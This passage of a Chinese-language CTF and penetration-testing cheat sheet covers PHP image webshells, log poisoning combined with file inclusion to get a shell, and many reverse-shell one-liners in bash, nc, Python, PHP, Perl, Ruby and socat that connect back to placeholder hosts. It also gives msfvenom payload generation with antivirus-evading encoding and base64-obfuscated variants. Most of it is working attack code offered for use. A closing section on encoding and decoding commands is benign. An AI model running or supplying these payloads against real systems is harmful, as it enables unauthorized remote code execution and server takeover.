## 方法三：十六进制插入（藏到图片数据段末尾）

```bash
# 生成：把马 append 到 jpg 后，再补上 jpg 的结束标记保持文件结构
cp a.jpg s.jpg
echo '<?php @eval($_POST["x"]);?>' >> s.jpg
# 检查文件头仍为 FFD8（图片）
xxd s.jpg | head -1
```

## 配合二次渲染

服务端用 GD 库「重画」图片（二次渲染）会剥离附加内容 → 用工具（如 `ImageTragick`、`gif二次渲染马生成器`）找渲染前后不变的字节块，把马插进去。

> [!danger] 图片马本身**不能直接执行**，必须配合：LFI 包含、Apache 多后缀（`shell.php.jpg`）、`.htaccess`、或包含函数（`include`/`require`）。上传成功 ≠ getshell。
### [shell-loginclude] 日志包含 GetShell | medium | 文件包含;getshell;日志投毒 | 日志包含;access.log;log poisoning
> 把马写进访问日志，再用 LFI 包含执行
## 原理

Web 服务器把每个请求记录到日志，**User-Agent 原样入日志**。用 UA 写一句话 → LFI 包含日志文件 → PHP 解析执行。

## 步骤

1. **UA 写马**（UA 里的引号要注意转义）：

```bash
curl -s http://target/index.php -A '<?php @eval($_POST["x"]);?>'
# 或编码避免过滤：
curl -s http://target/ -A '<?php $p="ev".chr(97)."l";$p($_POST["x"]);?>'
```

2. **包含日志**：

```
?file=/var/log/nginx/access.log
?file=/var/log/apache2/access.log
?file=/var/log/apache/access.log
?file=../../../../var/log/nginx/access.log
```

3. **连接**：

```bash
curl -s 'http://target/index.php?file=/var/log/nginx/access.log' -d 'x=system("id");'
```

## 常见日志路径速查

| 环境 | 路径 |
|---|---|
| Nginx | `/var/log/nginx/access.log`、`/var/log/nginx/access.log.1` |
| Apache | `/var/log/apache2/access.log`、`/var/log/apache/access.log` |
| Docker 内 | `/var/log/nginx/access.log`（容器内路径相同） |
| Nginx 源码编译 | `/usr/local/nginx/logs/access.log` |

## 其他可写可控的文件

```
/proc/self/environ          # 环境变量含 UA
/tmp/sess_<PHPSESSID>       # session 文件（先传参数把内容写进 session）
/var/log/mail.log           # 邮件头注入
```

> [!warn] 日志文件可能很大，包含会卡；UA 用短 payload。Nginx 默认不记录 UA 里的空格等（大概率原样记录），Apache 同理，但**引号**有时会被转义 → 用无引号写法。
## [reverseshell] 反弹 Shell 速查——拿到命令执行后，第一时间反弹到本地监听。
### [rs-bash] Bash / Sh 反弹 | easy | 反弹shell;RCE;bash | reverse shell;bash -i;/dev/tcp
> 最常用的 bash /dev/tcp 反弹
## 监听端（先开）

```bash
nc -lvnp 4444
```

## Bash（Linux 通用）

```bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

HTTP 参数里传输（URL 编码）：

```
;bash%20-i%20>%26%20/dev/tcp/YOUR_IP/4444%200>%261
```

## 变体

```bash
# 无 & > 场景
bash -i > /dev/tcp/1.2.3.4/4444 0<&1 2>&1

# sh（无 bash 时）
sh -i >& /dev/tcp/1.2.3.4/4444 0>&1

# 每行命令简化
0<&196;exec 196<>/dev/tcp/1.2.3.4/4444; sh <&196 >&196 2>&196

# 避免历史记录/干扰
bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'
```

> [!tip] Web 命令注入点里 `bash -i` 常因空格/特殊字符被卡，优先用 URL 编码或 base64 方式：

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQ== | base64 -d | bash
```
### [rs-nc] Netcat / OpenBSD nc 反弹 | easy | 反弹shell;nc;ncat | nc -e;ncat;netcat反弹
> nc 与 ncat 的反弹与监听
## 监听

```bash
nc -lvnp 4444
```

## 反弹（GNU netcat 带 -e）

```bash
nc -e /bin/sh 1.2.3.4 4444
nc -e /bin/bash 1.2.3.4 4444
```

## 无 -e 的 OpenBSD nc（Linux 常见默认）

```bash
nc 1.2.3.4 4444 -c /bin/sh
# 或管道法：
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f
```

## Ncat（带加密）

```bash
# 监听
ncat -lvnp 4444 --ssl
# 反弹
ncat --ssl 1.2.3.4 4444 -e /bin/sh
```

> [!info] 判断版本：`nc -h` 有 `-e` 即 GNU 版；有 `-c` 是 OpenBSD 版。靶机没有 nc 优先用 bash /dev/tcp 或 python。
### [rs-python] Python 反弹 | easy | 反弹shell;python | python反弹;python3;socket反弹
> python/python3 一行反弹（无 nc 场景首选）
## Python（经典单行）

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

## 短一点的可读版本

```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call("/bin/sh -i",shell=True)'
```

## 通过命令注入传（URL 编码引号）

```
;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444))...'
```

> [!tip] 命令注入点里 python 单引号字符串内嵌套双引号没问题，但若过滤了引号，可改用 `payload` 的 base64 版：

```bash
echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3M7IHMuPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCIxLjIuMy40Iiw0NDQ0KSk7W29zLmR1cDIoKHMuZmlsZW5vKCksZikgZm9yIGYgaW4gKDAsMSwyKV07c3VicHJvY2Vzcy5jYWxsKCIvYmluL3NoIC1pIixzaGVsbD1UcnVlKSc=' | base64 -d | bash
```
### [rs-php] PHP 反弹 | easy | 反弹shell;php | php反弹;fsockopen
> PHP fsockopen 反弹一行
## 单行

```php
php -r '$sock=fsockopen("1.2.3.4",4444);$descriptorspec=array(0=>$sock,1=>$sock,2=>$sock);$process=proc_open("/bin/sh -i",$descriptorspec,$pipes);'
```

## 更长更稳版本

```php
php -r '$sock=fsockopen("1.2.3.4",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## 在 webshell 里直接执行

```php
<?php $sock=fsockopen("1.2.3.4",4444);exec("/bin/sh -i <&3 >&3 2>&3");?>
```

## 通过命令注入（PHP 函数被禁的场景用其他语言）

```
;php -r '$sock=fsockopen("1.2.3.4",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

> [!warn] `exec`/`system` 被 disable_functions 禁掉时，`proc_open`/`fsockopen` 也可能被禁；此时考虑直接写文件或换 payload（如用 `pcntl_exec`，老版本 PHP 常可用）。
### [rs-perl] Perl / Ruby 反弹 | easy | 反弹shell;perl;ruby | perl反弹;ruby反弹
> Perl 与 Ruby 一行反弹
## Perl

```perl
perl -e 'use Socket;$i="1.2.3.4";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("1.2.3.4",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## 更易读的 Ruby

```ruby
ruby -rsocket -e 's=TCPSocket.new("1.2.3.4",4444);loop{cmd=s.gets.chomp;IO.popen(cmd,"r"){|io|s.print io.read}}'
```

> [!info] 优先级：bash /dev/tcp > python > nc(-e) > php > perl/ruby。按靶机环境挑一个能用的。
### [rs-socat] Socat 反弹（含加密） | medium | 反弹shell;socat;加密 | socat反弹;加密反弹
> socat 的普通与 TLS 加密反弹
## 监听与反弹（明文）

```bash
# 监听
socat TCP-LISTEN:4444,fork STDOUT
# 反弹
socat TCP:1.2.3.4:4444 EXEC:/bin/sh
```

## TLS 加密（流量不可见，适合打 WAF/抓流量环境）

```bash
# 生成证书并监听
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
socat OPENSSL-LISTEN:4444,cert=cert.pem,verify=0,fork STDOUT

# 靶机反弹
socat OPENSSL:1.2.3.4:4444,verify=0 EXEC:/bin/sh
```

> [!info] socat 还存在时常用它做端口转发：`socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80`。
### [rs-msf] MSF / msfvenom 反弹 | medium | 反弹shell;msf;msfvenom | msfvenom;meterpreter;kali反弹
> msfvenom 生成各平台 payload 与监听
## 生成

```bash
# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -o r.elf
# Linux x86（老机器）
msfvenom -p linux/x86/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -o r.elf
# PHP
msfvenom -p php/reverse_php LHOST=1.2.3.4 LPORT=4444 -f raw -o r.php
# Python
msfvenom -p python/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f raw
# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o r.exe
# 编码混淆（过简单杀软）
msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -e x86/x64/encoder -f elf -o r.elf
```

## 监听（msfconsole）

```
msfconsole -q
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

> [!tip] 不想开 msf 时，生成的 `shell_reverse_tcp` 用 `nc -lvnp 4444` 就能收（部分 payload 带 stager 需 msf 才能交互）。

> [!warn] 靶机可能缺执行权限：`chmod +x r.elf && ./r.elf`；ELF 在 Docker 里架构不匹配会直接崩，先 `uname -m` 确认架构。
### [rs-helper] 反弹 Shell 辅助技巧 | easy | 反弹shell;常用技巧 | 反弹技巧;upgrade shell;TTY
> 交互式 TTY、历史记录等反弹后的加工
## 拿到 shell 后升级为交互式 TTY

```bash
# 方案一：python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 方案二：监听端
# 在 nc 会话里：
Ctrl+Z                        # 挂起
stty raw -echo; fg            # 恢复并开启 raw 模式
# 然后：
export TERM=xterm             # 获得完整终端能力（vim/top 等）
```

## 监听端常见最优参数

```bash
rlwrap nc -lvnp 4444          # 支持上下键历史（rlwrap 增强）
# 或直接 socat 监听交互更好：
socat file:$(tty),raw,echo=0 TCP-L:4444
# 但反弹端需对应 socat：
socat TCP:1.2.3.4:4444 EXEC:"bash -i",pty,stderr,setsid,sigint,sane
```

## 常见坑

| 问题 | 处理 |
|---|---|
| 无 nc 无 python | bash /dev/tcp 或 perl |
| 防火墙只放 80/443 | 反弹端口改 80/443，或用 HTTPS(openssl/socat tls) |
| 命令注入过滤引号 | base64 解码管道执行 |
| shell 直接断开 | 反弹端加 `setsid` 或 nohup：`nohup bash -c '...' &` |
| 容器内无 bash | `/bin/sh` 或 `busybox sh` |
| 反弹后无交互提示 | 执行 `export PS1='$PWD> '` 或 `bash -i` |

> [!tip] 最省事组合：监听 `rlwrap nc -lvnp 4444`，反弹 `bash -i >& /dev/tcp/IP/4444 0>&1`，再 python 提 TTY。
## [encode] 编码转换一行命令——离线环境下最快的编码解码方式。
### [enc-base64] Base64 编解码 | easy | 编码;base64;命令 | base64解码;base64 命令
> base64 编码/解码的每平台速查
```bash
# 编码（注意 echo -n 不要带换行）
echo -n 'hello' | base64
echo 'aGVsbG8=' | base64 -d        # 解码

# 文件
base64 flag.php > flag.b64
base64 -d flag.b64 > flag.php

# URL 兼容（+/ 换 -_）
echo -n 'x' | base64 | tr '+/' '-_'

# Python 版（Windows/无 base64 命令时）
python3 -c "import base64;print(base64.b64encode(b'hello').decode())"
python3 -c "import base64;print(base64.b64decode('aGVsbG8=').decode())"
```

> [!tip] 特征识别：结尾常为 `=` 或 `==`；字符集 `A-Za-z0-9+/`。
### [enc-hex] Hex / 二进制编解码 | easy | 编码;hex;二进制 | hex解码;xxd;二进制转字符串
> 十六进制与二进制文本互转
```bash
# 字符串 -> hex
echo -n 'hack' | xxd -p
echo -n 'hack' | od -A n -t x1 | tr -d ' \n'

# hex -> 字符串
printf '6861636b' | xxd -r -p
echo '6861636b' | xxd -r -p

# 二进制 -> 字符串
printf '01101000 01100001 01100011 01101011' | tr -d ' ' | perl -pe 's/([01]{8})/chr(oct("0b$1"))/ge'

# Python 通用
python3 -c "print(bytes.fromhex('6861636b').decode())"
python3 -c "print('hack'.encode().hex())"
python3 -c "print(int('0110100001100001',2).to_bytes(4,'big'))"
```

> [!tip] 特征识别：纯 `0-9a-f` 且偶数字符 → hex。
### [enc-url] URL 编解码 | easy | 编码;URL编码;urlencode | url解码;percent编码
> URL 百分号编码互转
```bash
# 编码（把特殊字符变成 %xx）
python3 -c "import urllib.parse;print(urllib.parse.quote('a b<c', safe=''))"

# 解码
python3 -c "import urllib.parse;print(urllib.parse.unquote('a%20b%3cc'))"

# 只编码特殊字符（保留字母数字）
python3 -c "import urllib.parse;print(urllib.parse.quote('a b<c'))"

# 双重编码（绕过一次解码）
python3 -c "import urllib.parse;print(urllib.parse.quote(urllib.parse.quote('a b<c', safe=''), safe=''))"
```

> [!tip] 特征识别：`%` 后跟两位十六进制。Burp/浏览器 F12 里 Ctrl+Shift+U / Ctrl+Shift+K 也能直接编解码选中文本。
### [enc-rot] ROT / 凯撒编解码 | easy | 编码;ro13;凯撒 | rot13;凯撒密码;caesar
> ROT13 与凯撒位移的一行命令
```bash
# ROT13（字母位移 13，大小写独立）
printf 'uryyb' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
echo 'uryyb' | tr 'A-Za-z' 'N-ZA-Mn-za-m'   # 输出 hello

# 任意位移（凯撒）：位移 3 用 ROT3
printf 'khoor' | tr 'A-Za-z' 'D-ZA-Cd-za-c'  # hello

# Python ROT13
python3 -c "import codecs;print(codecs.encode('uryyb','rot13'))"

# 在线盲目猜位移（离线脚本）
python3 -c "
s='khoor'
for i in range(26):
    print(i, ''.join(chr((ord(c)-97+i)%26+97) if c.islower() else chr((ord(c)-65+i)%26+65) for c in s))
"
```

> [!tip] rot13 特征是：编码两次互相还原（`rot13(rot13(x))==x`），常嵌套在 base64/hex 外层。
### [enc-other] 其他编码与特征速查 | easy | 编码;html实体;unicode;识别 | html实体解码;unicode编码;常见编码识别
> HTML 实体、Unicode、易混淆编码的识别表
## HTML 实体

```bash
# 解码 &#104;&#101;&#108;&#108;&#111;
python3 -c "import html;print(html.unescape('&#104;&#101;&#108;&#108;&#111;'))"
# 编码
python3 -c "import html;print(''.join('&#%d;'%ord(c) for c in 'hello'))"
```

## Unicode / 特殊空白

```bash
# 打印字符串里所有字符的码点（找不可见字符/同形异义）
python3 -c "print([hex(ord(c)) for c in open('x.txt',encoding='utf-8').read()])"
```

## 常见编码特征速查表

| 特征 | 编码 | 解码命令 |
|---|---|---|
| `A-Za-z0-9+/` 且 `=` 结尾 | base64 | `base64 -d` |
| 纯 0-9a-f 偶数字符 | hex | `xxd -r -p` |
| `%xx` | URL 编码 | `urllib.parse.unquote` |
| `&#数字;` / `&#x十六进制;` | HTML 实体 | `html.unescape` |
| 由 `0-7` 组成 | 八进制 | `echo $((8#oct))` 或 Python `int(s,8)` |
| 只见 `0`/`1` | 二进制 | Python `int(s,2)` |
| `0x` 前缀 | hex | `xxd -r -p` |
| `Aa` 间隔形态（`啊a啊a`） | 混淆/编码器产物 | 看长度与字符集判断 |
| 大段令牌 `eyJ...` | JWT（base64url） | `base64 -d`（Payload 段） |
| 一串意义不明的字母 | 可能 rot13/凯撒 | `tr` 轮转尝试 |

## 万能解码脚本（离线）

```bash
python3 - <<'EOF'
import base64, binascii, urllib.parse, html, codecs
s = input("输入待解码串: ")
try: print("base64:", base64.b64decode(s).decode(errors="ignore"))
except: pass
try: print("hex:", bytes.fromhex(s).decode(errors="ignore"))
except: pass
try: print("url:", urllib.parse.unquote(s))
except: pass
try: print("html:", html.unescape(s))
except: pass
try: print("rot13:", codecs.decode(s, "rot13"))
except: pass
EOF
```
